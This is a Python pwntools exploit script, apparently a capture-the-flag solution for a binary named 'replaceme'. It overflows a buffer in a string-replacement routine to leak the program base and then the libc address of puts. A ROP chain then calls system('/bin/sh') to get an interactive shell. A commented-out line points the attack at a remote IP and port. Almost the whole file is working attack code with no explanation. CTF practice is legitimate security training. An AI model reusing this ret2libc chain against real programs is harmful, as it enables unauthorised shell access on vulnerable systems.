#!/usr/bin/python3

from pwn import *

exe = ELF("./replaceme_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.31.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "WARN"
context.log_level 	= "DEBUG"
isDebug = False
# isDebug = True

# brva 0x0000000000001570 first memcpy in do_replacement()

gs = '''
# break do_replacement
brva 0x0000000000001570
# brva 0x00000000000015F6
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def first_input(first_input):
	io.sendafter(b"Input : ", first_input)
	result = io.recvS()
	print(result)

def second_input(second_input, shouldPause = False):
	io.sendafter(b"Replacement : ", second_input)
	if shouldPause:
		pause()
	result = io.recv()
	print(result)
	return result
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56
io = start_local(isDebug)
######## REMOTE ########
# io = remote("94.237.48.237", 32164)
io.timeout = 0.5

result = io.recvS()
print(result)

# Leak the binary base by leaking the return address
# pause()
first_input(b"\x66" * 0x7f + b"a")
leak = second_input(b"s/a/" + b"\x77" * 0x49 + p8(0x4e) + b"/", False)
main_address_leak = leak[0xf5:0xfb] 
main_address = int.from_bytes(main_address_leak, byteorder='little')
exe.address = main_address - 0x164e
print(f"{hex(main_address)=}")
print(f"{hex(exe.address)=}")

pop_rdi = exe.address + 0x0000000000001733
return_to_puts = exe.address + 0x0000000000001667

# leak libc by printing puts.got using puts.plt
# pause()
first_input(b"\x66" * 0x7f + b"a")
leak = second_input(b"s/a/" + b"\x77" * 0x49 + p64(pop_rdi) + p64(exe.got['puts']) + p64(return_to_puts) + b"/")
puts_address_leak = leak[0xfb:0x101] 
puts_address = int.from_bytes(puts_address_leak, byteorder='little')
libc.address = puts_address - 0x84420
print(f"{hex(libc.address)=}")

# Ret2System
# pause()
first_input(b"\x66" * 0x7f + b"a")
leak = second_input(b"s/a/" + b"\x77" * 0x49 + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(libc.sym['system']) + b"/", False)

io.interactive()